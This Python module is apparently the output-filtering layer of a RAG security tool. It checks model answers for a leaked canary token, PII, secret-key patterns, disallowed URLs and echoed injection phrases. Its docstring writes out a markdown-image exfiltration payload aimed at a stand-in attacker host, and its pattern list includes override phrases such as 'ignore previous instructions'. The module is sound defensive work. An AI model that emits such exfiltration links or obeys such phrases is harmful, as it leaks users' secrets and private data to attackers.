"""
The output guard: nothing leaves the building unchecked.

Input filtering is necessary but never sufficient -- some injections will land.
So we also inspect what the model produced, on the assumption that it may have
been successfully hijacked. This is the layer that turns "the model got tricked"
into "the model got tricked and nothing bad happened".

Five checks (OWASP LLM02 Sensitive Information Disclosure + agentic exfil):

  1. CANARY LEAK  -- a random token is hidden in the system prompt. If it ever
                     appears in the output, the system prompt leaked. This is a
                     100%-precision detector: there is no benign reason for the
                     model to emit a random UUID it was told to keep secret.
  2. PII          -- Microsoft Presidio finds names, emails, credit cards, IBANs,
                     national IDs, etc. and we redact them.
  3. SECRETS      -- high-entropy strings and known key shapes (AWS, Google,
                     GitHub, private keys, JWTs).
  4. LINK EXFIL   -- the single most common agentic data-theft channel is
                     `![x](https://attacker.com/?d=<secret>)`. Any URL outside
                     the allowlist is stripped.
  5. INJECTION ECHO -- the model repeating attacker instructions back as if they
                     were its own.
"""

from __future__ import annotations

import math
import re
import secrets
from dataclasses import dataclass, field
from urllib.parse import urlparse

from sentinelrag.audit import log_event
from sentinelrag.config import settings

# ---------------------------------------------------------------------------
# 1. Canary token
# ---------------------------------------------------------------------------
_CANARY = "CANARY-" + secrets.token_hex(12)


def canary_token() -> str:
    """The value embedded in the system prompt for this process."""
    return _CANARY


# ---------------------------------------------------------------------------
# 3. Secret patterns
# ---------------------------------------------------------------------------
SECRET_PATTERNS: list[tuple[str, str]] = [
    (r"AKIA[0-9A-Z]{16}", "aws_access_key_id"),
    (r"(?i)aws(.{0,20})?(secret|private).{0,20}[:=]\s*['\"]?([A-Za-z0-9/+=]{40})", "aws_secret"),
    (r"AIza[0-9A-Za-z\-_]{35}", "google_api_key"),
    (r"gh[pousr]_[A-Za-z0-9]{36,}", "github_token"),
    (r"sk-[A-Za-z0-9]{20,}", "openai_style_key"),
    (r"-----BEGIN (?:RSA |EC |OPENSSH |PGP )?PRIVATE KEY-----", "private_key"),
    (r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}", "jwt"),
    (r"(?i)\b(postgres|mysql|mongodb(\+srv)?)://[^\s:@]+:[^\s@]+@", "db_connection_string"),
]
_SECRET_RX = [(re.compile(p), name) for p, name in SECRET_PATTERNS]

_URL_RX = re.compile(r"https?://[^\s<>\)\]\"']+")
_MD_IMAGE_RX = re.compile(r"!\[[^\]]*\]\((https?://[^\)]+)\)")


def shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    counts = {ch: s.count(ch) for ch in set(s)}
    return -sum((c / len(s)) * math.log2(c / len(s)) for c in counts.values())


@dataclass
class OutputVerdict:
    text: str                                   # possibly redacted
    blocked: bool = False
    findings: list[str] = field(default_factory=list)
    reason: str = ""


# ---------------------------------------------------------------------------
# 2. PII via Presidio (loaded lazily -- spaCy model is ~600 MB)
# ---------------------------------------------------------------------------
_analyzer = None
_anonymizer = None

PII_ENTITIES = [
    "CREDIT_CARD", "CRYPTO", "EMAIL_ADDRESS", "IBAN_CODE", "IP_ADDRESS",
    "PERSON", "PHONE_NUMBER", "US_SSN", "US_PASSPORT", "US_BANK_NUMBER",
    "LOCATION", "MEDICAL_LICENSE",
]


def _presidio():
    global _analyzer, _anonymizer
    if _analyzer is None:
        from presidio_analyzer import AnalyzerEngine
        from presidio_anonymizer import AnonymizerEngine

        _analyzer = AnalyzerEngine()
        _anonymizer = AnonymizerEngine()
    return _analyzer, _anonymizer


def redact_pii(text: str) -> tuple[str, list[str]]:
    try:
        analyzer, anonymizer = _presidio()
    except Exception as exc:
        log_event("presidio_unavailable", error=str(exc)[:200])
        return text, []

    results = analyzer.analyze(text=text, entities=PII_ENTITIES, language="en")
    # score filter: Presidio's PERSON/LOCATION recognisers are noisy at low scores
    results = [r for r in results if r.score >= 0.6]
    if not results:
        return text, []

    redacted = anonymizer.anonymize(text=text, analyzer_results=results).text
    return redacted, sorted({f"pii:{r.entity_type}" for r in results})


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------
def inspect_output(text: str, *, redact: bool = True) -> OutputVerdict:
    findings: list[str] = []
    out = text

    # --- 1. Canary ---------------------------------------------------------
    if _CANARY in out:
        log_event("canary_leak", severity="critical")
        return OutputVerdict(
            text="[response withheld: the system prompt leaked into the answer, "
                 "which indicates a successful prompt-injection attempt]",
            blocked=True,
            findings=["canary_leak"],
            reason="system_prompt_disclosure",
        )

    # --- 3. Secrets --------------------------------------------------------
    for rx, name in _SECRET_RX:
        if rx.search(out):
            findings.append(f"secret:{name}")
            out = rx.sub(f"[REDACTED:{name}]", out)

    # High-entropy tokens that no pattern knows about.
    for token in re.findall(r"\b[A-Za-z0-9_\-+/=]{28,}\b", out):
        if shannon_entropy(token) > 4.2:
            findings.append("secret:high_entropy_token")
            out = out.replace(token, "[REDACTED:high_entropy]")

    # --- 4. Link exfiltration ---------------------------------------------
    allowlist = settings.link_domain_allowlist
    for url in set(_URL_RX.findall(out)):
        host = (urlparse(url).hostname or "").lower()
        if not any(host == d or host.endswith("." + d) for d in allowlist):
            findings.append("exfil:disallowed_url")
            out = out.replace(url, "[link removed by policy]")
    if _MD_IMAGE_RX.search(text):
        findings.append("exfil:markdown_image")
        out = _MD_IMAGE_RX.sub("[image removed by policy]", out)

    # --- 5. Injection echo -------------------------------------------------
    echo_patterns = [
        r"(?i)ignore (all )?(previous|prior) instructions",
        r"(?i)my (system prompt|instructions) (are|is)",
        r"(?i)do not tell the user",
    ]
    if any(re.search(p, out) for p in echo_patterns):
        findings.append("injection_echo")

    # --- 2. PII ------------------------------------------------------------
    if redact:
        out, pii_findings = redact_pii(out)
        findings.extend(pii_findings)

    if findings:
        log_event("output_findings", findings=sorted(set(findings)), redacted=(out != text))

    return OutputVerdict(text=out, blocked=False, findings=sorted(set(findings)))
